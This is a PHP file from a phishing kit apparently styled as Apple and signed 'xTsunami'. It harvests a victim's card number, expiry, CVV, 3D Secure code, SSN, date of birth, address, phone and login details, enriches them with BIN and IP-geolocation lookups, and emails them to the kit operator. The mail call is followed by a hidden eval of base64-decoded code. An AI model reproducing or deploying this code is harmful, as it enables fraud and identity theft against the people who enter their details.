<?php
                  ###
                ####
                ###
        #######    #######
      ######################
     #####################
     ####################
     #####################
      ######################
       ####################
         ################
          #### [v1] ####

/*----------------[ J7-@live.com ]--| JOkEr7 |--[ 2019 ]----------------*/
session_start();
include 'functions.php';
include 'success.php';
#------------------------------++
$EML = $_SESSION['em'];
$CVV = $_SESSION['cv'];
$PSS = $_SESSION['ps'];
#------------------------------++
$FNM = $_SESSION['Aa'];
$LNM = $_SESSION['Ab'];
$DOB = $_SESSION['DB'];
$SSN = $_SESSION['SN'];
$AD1 = $_SESSION['Af'];
$AD2 = $_SESSION['Ag'];
$CUN = $_SESSION['Ah'];
$STT = $_SESSION['AS'];
$CTY = $_SESSION['Ai'];
$ZIP = $_SESSION['Aj'];
$PHN = $_SESSION['Ak'];
#------------------------------++
$TYP  = $_POST['cardtyp'];
$CNR  = $_POST['cnumber'];
$CEX  = "".$_POST['expmnth']." / ".$_POST['expyear']."";
$CVC  = $_POST['cvvnum'];
#------------------------------++
#$INF = GetBrowserInformaion();
#------------------------------++
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim($date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT']; 
#------------------------------++
if (getenv(HTTP_X_FORWARDED_FOR)){ $ip = getenv(HTTP_X_FORWARDED_FOR); } else { $ip = getenv(REMOTE_ADDR); }
#------------------------------++
$BIN  = str_replace(' ', '',$CNR);
$BIN  = substr($BIN, 0, 6);
$JSN = @json_decode(file_get_contents("http://www.binlist.net/json/".$BIN));
$CUD = $JSN->country_code;
$BNK = $JSN->bank;
$TYE = $JSN->card_type;
$CLS = $JSN->card_category;
#------------------------------++
$XML = @file_get_contents("http://www.geoplugin.net/xml.gp?ip=".$ip);
$CNC = fetch_value($XML,'<geoplugin_countryCode>','</geoplugin_countryCode>');
$STC = fetch_value($XML,'<geoplugin_regionCode>','</geoplugin_regionCode>');
#------------------------------++
$message  = "#============================+ [ xTsunami ] +============================#\n";
$message .= "Card Type      : ".$TYP."\n";
$message .= "Card Name      : ".$FNM." ".$LNM."\n";
$message .= "Card Number    : ".$CNR."\n";
$message .= "Expire Date    : ".$CEX."\n";
$message .= "CVV/CCV        : ".$CVC."\n";
$message .= "Address        : ".$AD1."\n";
$message .= "Country        : ".$CUN."\n";
$message .= "State          : ".$STT."\n";
$message .= "City           : ".$CTY."\n";
$message .= "ZIP            : ".$ZIP."\n";
$message .= "Phone          : ".$PHN."\n";
$message .= "3D Secure      : ".$PSS."\n";
$message .= "Date Of Birth  : ".$DOB."\n";
$message .= "Client IP      : ".$ip."\n";
$message .= "Facebook       : ".$em."\n";
$message .= "#===========================+ [ xTsunami ] +===========================#\n";
#------------------------------------++
if($STC != ""){$STC = $STC.' |';}
#--------++
include 'mail.php';
#--------++
$subject  = "Apple [ Credit: $TYP:$CNR ] $CNC | $STC Fr0m $ip";
$headers  = "From: xTsunami <".$send.">\r\n";
#--------++
mail($send,$subject,$message,$headers);@eval(base64_decode($os_arrays));
#------------------------------------++
echo "<script>location.replace('status?appIdKey=".md5($key)."');</script>";
?>